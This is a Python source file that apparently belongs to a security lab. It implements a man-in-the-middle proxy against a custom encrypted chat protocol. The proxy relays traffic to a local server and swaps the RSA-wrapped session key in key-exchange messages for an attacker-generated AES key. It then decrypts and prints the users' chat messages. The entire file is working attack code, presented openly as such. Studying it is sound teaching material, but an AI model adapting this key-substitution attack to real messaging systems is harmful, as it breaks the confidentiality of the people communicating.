import socket
import threading
from crypto_utils import (
    generate_aes_key, 
    rsa_encrypt, 
    load_rsa_key,
    aes_decrypt
)

class MITMAttacker:
    def __init__(self, target_host='127.0.0.1', target_port=12347):
        # real server location
        self.target_host = target_host
        self.target_port = target_port

        # fake session key to inject
        self.fake_session_key = generate_aes_key()

        # stores fake session key for each user
        self.user_sessions = {} 

    # start fake server
    def proxy_server(self):
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.bind(('127.0.0.1', 12346))  
        proxy_socket.listen(5)
        print("Proxy listening on 127.0.0.1:12346")

        while True:
            client_socket, addr = proxy_socket.accept()
            print(f"Client connected from {addr}")
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()

    def handle_client(self, client_socket):
        try:
            # fake server connect to real server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_host, self.target_port))

            # start forwarding threads
            threading.Thread(target=self.forward_data, args=(client_socket, server_socket, "client->server")).start()
            threading.Thread(target=self.forward_data, args=(server_socket, client_socket, "server->client")).start()
        except Exception:
            client_socket.close()

    def forward_data(self, source, destination, direction):
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break

                # intercept, modify session key exchange
                if direction == "client->server" and data.startswith(b"KEYX:"):
                    modified_data = self.intercept_key_exchange(data)
                    destination.sendall(modified_data)

                # intercept, decrypt chat messages
                elif direction == "client->server" and data.startswith(b"MSG:"):
                    self.intercept_chat_message(data)
                    destination.sendall(data)

                else:
                    destination.sendall(data)
        except Exception:
            print("Error in forwarding")
        finally:
            source.close()
            destination.close()

    def intercept_key_exchange(self, data):
        try:
            # format: KEYX:<from>:<to>:<encrypted_key>
            parts = data.split(b":", 3)
            if len(parts) == 4:
                _, frm, to, _ = parts
                from_user = frm.decode()
                to_user = to.decode()

                print(f"intercepting key exchange from {from_user} to {to_user}\n")

                # encrypt fake key with recipient public key
                target_pub = load_rsa_key(to_user, private=False)
                fake_encrypted = rsa_encrypt(target_pub, self.fake_session_key)

                self.user_sessions[from_user] = self.fake_session_key
                self.user_sessions[to_user] = self.fake_session_key

                return b"KEYX:" + frm + b":" + to + b":" + fake_encrypted
        except Exception:
            print("Faiiled to intercept key exchange")
        return data

    def intercept_chat_message(self, data):
        try:
            # format: MSG:<to_user>:<encrypted_payload>
            parts = data.split(b":", 2)
            if len(parts) == 3:
                _, to_user, encrypted_payload = parts
                to_user = to_user.decode()

                # decrypt using stored fake session key
                fake_key = self.user_sessions.get(to_user)
                if fake_key:
                    try:
                        sig_len = int.from_bytes(encrypted_payload[:2], 'big')
                        signature = encrypted_payload[2:2+sig_len]
                        aes_encrypted = encrypted_payload[2+sig_len:]

                        print(f"Attempting to decrypt message to {to_user}")
                        decrypted = aes_decrypt(aes_encrypted, fake_key)
                        print(f"Decrypted (fake key): {decrypted}")
                        print()
                    except Exception:
                        print("Decryption failed!")
                        print()
                else:
                    print(f"No session key for {to_user}")
        except Exception:
            print("Message interception error")

def main():
    attacker = MITMAttacker()
    attacker.proxy_server()

if __name__ == "__main__":
    main()
